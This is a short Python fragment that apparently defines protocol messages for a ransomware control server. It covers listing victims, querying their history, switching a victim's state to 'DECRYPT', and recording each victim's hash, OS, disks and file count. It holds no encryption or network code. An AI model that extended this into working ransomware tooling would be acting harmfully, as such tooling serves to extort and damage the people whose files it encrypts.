list_victim_req = { 'LIST_REQ': None }



list_victim_end = { 'LIST_END': None }


history_req = {
'HIST_REQ': id
}
history_resp = {
    'HIST_RESP': id,
    'TIMESTAMP': "",
    'STATE': "",
    'NB_FILES': ""
}
history_end = {
'HIST_END': ""
}


change_state = {
    'CHGSTATE': id,
    'STATE': 'DECRYPT'
}


def creat_dict(message):

    return {
        'VICTIM': message[0],
        'HASH': message[1],
        'OS': message[2],
        'DISKS': message[3],
        #'STATE': [],
        'NB_FILES': message[4]
    }


#def creat_hist(message):
